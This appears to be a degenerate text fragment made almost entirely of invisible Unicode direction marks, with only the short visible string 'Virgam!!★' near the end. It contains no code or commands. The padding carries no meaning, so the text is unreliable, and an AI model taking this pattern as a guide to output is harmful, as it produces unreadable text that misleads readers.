‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏